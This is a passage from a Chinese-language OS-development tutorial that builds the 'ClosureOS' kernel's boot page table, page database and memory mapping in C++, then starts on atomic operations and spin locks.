physmem_end;<br>    mm::Page *pgdb_base;<br>    base::<span class="hljs-type">size_t</span> pgdb_page_nr;<br>    <span class="hljs-type">int</span> ret;<br><br>    boot_kern_pgtable = (mm::<span class="hljs-type">phys_addr_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) boot_kern_pgtable)) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FAILED to allocate new page table!&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br>    <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) boot_kern_pgtable, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    <span class="hljs-comment">/* map kernel ELF */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-built_in">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (elf64_shdr*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (elf64_shdr*) ((mm::<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-built_in">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> (!(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_PROGBITS) &#123;    <span class="hljs-comment">/* for .text, .data, .rodata */</span><br>            seg_phys_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset - PAGE_SIZE;<br>            seg_phys_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_phys_start + shdr-&gt;sh_size);<br>            seg_virt_start =shdr-&gt;sh_addr;<br><br>            <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_phys_start += PAGE_SIZE;<br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shdr-&gt;sh_type &amp; SHT_NOBITS) &#123;   <span class="hljs-comment">/* for .bss */</span><br>            seg_virt_start = shdr-&gt;sh_addr;<br>            seg_virt_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_virt_start + shdr-&gt;sh_size);<br><br>            <span class="hljs-keyword">while</span> (seg_virt_start &lt; seg_virt_end) &#123;<br>                pte_attr = PTE_ATTR_P;<br>                <span class="hljs-keyword">if</span> (shdr-&gt;sh_flags &amp; SHF_WRITE) &#123;<br>                    pte_attr |= PTE_ATTR_RW;<br>                &#125;<br><br>                seg_phys_start = (mm::<span class="hljs-type">phys_addr_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) seg_phys_start)) &#123;<br>                    <span class="hljs-keyword">return</span> -ENOMEM;<br>                &#125;<br><br>                <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) seg_phys_start, <span class="hljs-number">0</span>, PAGE_SIZE);<br>                ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                          seg_virt_start,<br>                                          seg_phys_start,<br>                                          pte_attr);<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                    <span class="hljs-keyword">return</span> ret;<br>                &#125;<br><br>                seg_virt_start += PAGE_SIZE;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">/* unknown but we need to allocate??? */</span><br>            <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] Unknown segment. ELF mapping stopped.&quot;</span>);<br>            <span class="hljs-keyword">return</span> -EFAULT;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for frame buffer */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">boot_tty_has_fb</span>()) &#123;<br>        seg_phys_start = ((mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_base) &amp; PAGE_MASK;<br>        seg_virt_start = seg_phys_start;<br>        seg_phys_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_phys_start + <span class="hljs-built_in">boot_tty_fb_sz</span>());<br>        <span class="hljs-keyword">while</span> (seg_phys_start &lt; seg_phys_end) &#123;<br>            ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                      seg_virt_start,<br>                                      seg_phys_start,<br>                                      PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">/* out of memory */</span><br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            seg_phys_start += PAGE_SIZE;<br>            seg_virt_start += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* map for direct mapping area */</span><br>    physmem_start = physmem_end = <span class="hljs-number">0x0000000000000000</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr &amp; PAGE_MASK;<br>        mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        mm::<span class="hljs-type">virt_addr_t</span> vaddr = base + mm::KERN_DIRECT_MAP_REGION_BASE;<br><br>        <span class="hljs-keyword">if</span> (end &gt; physmem_end) &#123;<br>            physmem_end = end;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vaddr &lt; base) &#123;<br>            <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;[x] FATAL: memory region base 0x&quot;</span>);<br>            <span class="hljs-built_in">boot_printhex</span>(base);<br>            <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot; has caused an integer overflow in memory mapping.&quot;</span>);<br>            <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot; hlt &quot;</span>)</span></span>;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> (vaddr &gt; mm::KERN_DIRECT_MAP_REGION_END) &#123;   <span class="hljs-comment">/* out of 64TB */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                vaddr,<br>                                base,<br>                                PTE_ATTR_P | PTE_ATTR_RW);<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> ret;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>            vaddr += PAGE_SIZE;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h3 id="Extra-添加-KASLR-支持"><a href="#Extra-添加-KASLR-支持" class="headerlink" title="Extra. 添加 KASLR 支持"></a><em>Extra. 添加 KASLR 支持</em></h3><blockquote><p>咕咕咕 🕊🕊🕊</p><p>暂时先留给大家当课后作业了，tips：映射前给几个变量加上偏移值就行，不过你或许还需要额外修改一些链接 flags？ ： ）</p></blockquote><h2 id="建立内存页数据库"><a href="#建立内存页数据库" class="headerlink" title="建立内存页数据库"></a>建立内存页数据库</h2><p>接下来我们开始建立 <strong>内存页数据库</strong> （page database），这一个内存区域的存在是为了能够更好地管理所有的物理页框，首先我们使用如下结构表示单张内存页，其中 <code>type</code> 字段用来表示当前内存页的类型，<code>ref_count</code> 字段为当前页面的引用计数（闲置时为 <code>-1</code>），其他字段我们会在后续使用到时进行说明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> &#123;<br>    PAGE_NON_EXISTED = <span class="hljs-number">0</span>,<br>    PAGE_NORMAL_MEM,<br>    PAGE_RESERVED,<br>    PAGE_ACPI_RECLAIMABLE,<br>    PAGE_NVS,<br>    PAGE_BADRAM,<br>&#125;;<br><br><span class="hljs-comment">/* for `type == PAGE_NORMAL_MEM` only */</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">migrate_type</span> &#123;<br>    MIGRATE_UNMOVABLE = <span class="hljs-number">0</span>,<br>    MIGRATE_MOVABLE,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct Page</span><br><span class="hljs-comment"> * - representing a `physical page frame`</span><br><span class="hljs-comment"> * - page-aligned size</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">NOTE:</span> we ONLY store some critical information at the head page, as it takes too long to assign the value</span><br><span class="hljs-comment"> * to every page, but only recording it at the head and to find the head at use is enough.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Page</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    lib::ListHead list;<br>    <span class="hljs-keyword">struct</span> &#123;<br>        <span class="hljs-comment">/* for page allocator */</span><br>        <span class="hljs-type">unsigned</span> type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> migrate_type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> is_free: <span class="hljs-number">1</span>; <span class="hljs-comment">/* already in freelist */</span><br>        <span class="hljs-type">unsigned</span> is_head: <span class="hljs-number">1</span>; <span class="hljs-comment">/* head of a group of pages*/</span><br>        <span class="hljs-type">unsigned</span> order: <span class="hljs-number">4</span>;<br>    &#125;;<br>    lib::atomic::<span class="hljs-type">atomic_t</span> ref_count;     <span class="hljs-comment">/* -1 for free */</span><br>    lib::atomic::<span class="hljs-type">atomic_t</span> map_count;     <span class="hljs-comment">/* mapped count in processes */</span><br>    lib::atomic::SpinLock lock;<br>    <span class="hljs-type">void</span> **freelist;    <span class="hljs-comment">/* used only when the slub is not a cpu partial */</span><br>    KMemCache *kc;  <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br>    PagePool *pool; <span class="hljs-comment">/* SHOULD remains unchanged after initialization */</span><br>    base::<span class="hljs-type">size_t</span> obj_nr;      <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br><br>    <span class="hljs-comment">/* unused area to make it page-aligned, maybe we can put sth else there? */</span><br>    base::<span class="hljs-type">size_t</span> unused[<span class="hljs-number">0</span>];<br>&#125; __attribute__((<span class="hljs-built_in">aligned</span>(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><p>现在我们引入内存页数据库的概念，这是一个由 <code>struct page</code> 所组成的数组， <strong>数组下标直接对应物理页框号</strong> ，通过这样的一个结构我们便能非常方便地管理所有的内存页，由于 <code>struct page</code> 大小为 64 字节，我们的内存页数据库将会使用相当数量的内存来表示所有的内存，为了保证这是一个虚拟地址连续的数组， <strong>我们单独分配一个内存区域来存放 page 结构体</strong> ：</p><p><img src="https://s2.loli.net/2024/06/22/aeqr5QcwOKJzNfy.png"></p><p>我们首先进行该区域的映射建立：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>    <br>    <span class="hljs-comment">/* map for page database (`struct page` array) */</span><br>    pgdb_base = (mm::Page*) mm::KERN_PAGE_DATABASE_REGION_BASE;<br>    pgdb_page_nr = (physmem_end - physmem_start) / PAGE_SIZE;<br><br>    <span class="hljs-keyword">for</span> (base::<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; pgdb_page_nr; i += mm::PGDB_PG_PAGE_NR) &#123;<br>        <span class="hljs-type">void</span> *new_page = <span class="hljs-built_in">boot_mm_page_alloc</span>();<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">IS_ERR_PTR</span>(new_page)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">PTR_ERR</span>(new_page);<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) new_page, <span class="hljs-number">0</span>, PAGE_SIZE);<br>        ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                  (mm::<span class="hljs-type">virt_addr_t</span>) &amp;pgdb_base[i],<br>                                  (mm::<span class="hljs-type">phys_addr_t</span>) new_page,<br>                                  PTE_ATTR_P | PTE_ATTR_RW);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> ret;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><p>完成这些工作之后， <strong>我们便直接装载这份新的页表，作为后续正式的内核页表</strong> ，并初始化一些记录内存段的变量，以及将一些可能还会用到的指针重新映射到 <code>Direct Mapping Area</code> ，因为我们不能保证在加载新页表后其所在内存区域仍然有映射：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_load_pgtable</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> pgtable)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;mov    %0, %%rax;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;mov    %%rax, %%cr3;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        :</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;a&quot;</span> (pgtable)</span></span><br><span class="hljs-params"><span class="hljs-function">    )</span></span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* ... */</span>    <br><br>    <span class="hljs-comment">/* load the new page table now! */</span><br>    <span class="hljs-built_in">boot_mm_load_pgtable</span>(boot_kern_pgtable);<br><br>    <span class="hljs-comment">/* init for some vals */</span><br>    mm::physmem_base = mm::KERN_DIRECT_MAP_REGION_BASE;<br>    mm::kernel_base = mm::KERN_SEG_TEXT_REGION_START;<br>    mm::vmremap_base = mm::KERN_DYNAMIC_MAP_REGION_BASE;<br>    mm::pgdb_base = pgdb_base;<br>    mm::pgdb_page_nr = pgdb_page_nr;<br><br>    <span class="hljs-comment">/* remap some variables we may still use */</span><br>    elf_info_tag = (multiboot_tag_elf_sections*) mm::<span class="hljs-built_in">phys_to_virt</span>((mm::<span class="hljs-type">phys_addr_t</span>) elf_info_tag);<br>    mmap_tag = (multiboot_tag_mmap*) mm::<span class="hljs-built_in">phys_to_virt</span>((mm::<span class="hljs-type">phys_addr_t</span>) mmap_tag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们根据 multiboot2 tags 所提供的内存信息来初始化 page 结构体数组，并根据临时线性内存分配器的分配地址计算页面引用计数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_page_database_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * as we set all page to 0 at the beginning,we don&#x27;t need to care about hole</span><br><span class="hljs-comment">     * because the type for memory hole is 0 in our design</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>        mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        base::<span class="hljs-type">size_t</span> pfn;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            pfn = base / PAGE_SIZE;<br>            <span class="hljs-comment">/* initialized value for every page */</span><br>            mm::pgdb_base[pfn].migrate_type = mm::MIGRATE_UNMOVABLE;    <span class="hljs-comment">/* temporarily only this only */</span><br>            mm::pgdb_base[pfn].lock.<span class="hljs-built_in">Reset</span>();<br>            mm::pgdb_base[pfn].kc = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].pool = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].freelist = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].obj_nr = <span class="hljs-number">0</span>;<br>            lib::<span class="hljs-built_in">list_head_init</span>(&amp;mm::pgdb_base[pfn].list);<br><br>            <span class="hljs-keyword">switch</span> (mmap_tag-&gt;entries[i].type) &#123;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_AVAILABLE:<br>                mm::pgdb_base[pfn].type = mm::PAGE_NORMAL_MEM;<br><br>                <span class="hljs-keyword">if</span> (base &lt; curr_avail || <span class="hljs-built_in">addr_is_in_used_range</span>(base)) &#123;<br>                    <span class="hljs-comment">/* used page */</span><br>                    lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">/* free page */</span><br>                    lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_RESERVED:<br>                mm::pgdb_base[pfn].type = mm::PAGE_RESERVED;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_ACPI_RECLAIMABLE:<br>                mm::pgdb_base[pfn].type = mm::PAGE_ACPI_RECLAIMABLE;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_NVS:<br>                mm::pgdb_base[pfn].type = mm::PAGE_NVS;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_BADRAM:<br>                mm::pgdb_base[pfn].type = mm::PAGE_BADRAM;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                mm::pgdb_base[pfn].type = mm::PAGE_UNKNOWN;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                boot_printstr(&quot;[!] Warning: unknown memory type [&quot;);</span><br><span class="hljs-comment">                boot_printnum(mmap_tag-&gt;entries[i].type);</span><br><span class="hljs-comment">                boot_printstr(&quot;] at addr: 0x&quot;);</span><br><span class="hljs-comment">                boot_printhex(base);</span><br><span class="hljs-comment">                boot_putchar(&#x27;\n&#x27;);</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>到目前为止，我们已经 <strong>基本完成进入高半部内核前的准备了</strong> ，接下来我们直接跳转到位于高地址的代码继续进行后续的内核初始化工作</p><h3 id="Extra-添加原子操作与自旋锁支持"><a href="#Extra-添加原子操作与自旋锁支持" class="headerlink" title="Extra. 添加原子操作与自旋锁支持"></a><em>Extra. 添加原子操作与自旋锁支持</em></h3><p>原子操作（atomic operations）指的是独立而 <strong>不可被打断的操作</strong> ，这类操作可以由单个或多个子操作组成， <strong>原子内存操作</strong> 即提供了原子性的内存操作，即在同一时刻仅有单个核心能够访问指定内存，其通常被用来在并发环境中实现同步，比较常用的有：</p><ul><li>原子比较与赋值：对比指定内存位置上值是否与指定值相等，若是则赋予新值，否则报错</li><li>原子自增自减：将指定内存位置上值加一或减一</li><li>原子读写：获取&#x2F;覆写指定内存位置上值</li></ul><p>例如在 x86 下我们可以通过如添加了 <code>lock</code> 前缀的汇编指令在访问内存的同时完成对总线的控制，<strong>从而从硬件层面确保了内存访问的唯一性</strong>：</p><blockquote><p>注：该示例代码仅用于讲解原理， <strong>未</strong> 用于 ClosureOS 中</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">atomic_xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> result;<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;1&quot;</span> (newval)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">    )</span></span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 GCC 中，我们可以直接使用 <a href="https://gcc.gnu.org/onlinedocs/gcc-4.1.1/gcc/Atomic-Builtins.html">编译器内置的原子内存访问函数</a> 来实现原子操作，编译器在生成代码时便会自动生成带有 <code>lock</code> 等前缀的指令：</p><p><img src="https://s2.loli.net/2024/06/26/ZD6mkxFzEyc4V9f.png"></p><p>我们将同一时间仅允许一个核心进行访问的资源称为临界资源（critical resource），将访问临界资源的代码称为临界区（critical region）—— <strong>锁</strong> （lock）是一种用来确保在同一时间仅有一个核心进入指定临界区的数据结构，软件设计规范中我们通常要求程序在访问临界资源前需要持有锁，在完成对临界资源的操作后释放锁，从而确保同一时间仅有单个核心在访问该临界资源</p><p>通过原子内存操作中的 <code>比较与交换</code> 操作，我们可以很容易实现一个简单的锁：</p><ul><li>定义一个整形变量作为锁，0 为已释放，1 为仍被持有</li><li>循环调用 GCC 内建函数 <code>__sync_bool_compare_and_swap()</code> 进行原子操作：检测锁变量的值，其为 0 时将其改为 1</li><li>完成操作后将锁变量的值更改为 0</li></ul><p>由于锁在被持有的情况下请求锁的一方会循环不停地检查，因此这种锁被称为 <strong>自旋锁</strong> （spin lock），我们的实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 